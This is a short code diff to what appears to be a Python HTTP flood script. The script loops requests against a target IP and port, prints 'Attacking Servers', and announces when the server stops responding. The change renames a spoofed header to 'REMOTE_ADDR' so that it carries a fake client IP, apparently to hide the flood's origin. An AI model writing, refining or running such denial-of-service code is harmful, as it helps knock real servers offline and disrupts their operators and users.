@@ -67,7 +67,7 @@ while True:
                 "Referer": f"{res}",
                 "Cache-Control": "no-store, no-cache",
                 "Host": f"{ip}",
-                "IP": f"{fip}"
+                "REMOTE_ADDR": f"{fip}"
             }
             response = requests.get(url, headers=headers)
             print(f"{red}Attacking {yellow}Servers{red} At{blue} {ip} {red}Port {blue}{port} : {white}", counter)
@@ -79,3 +79,4 @@ while True:
             print(red + f"Error While Attacking.. Did you write the Targets URL correctly?")
             exit()
     print(green + f"[ + ] The Server Just Stopped Responding.. [ + ]")
+    
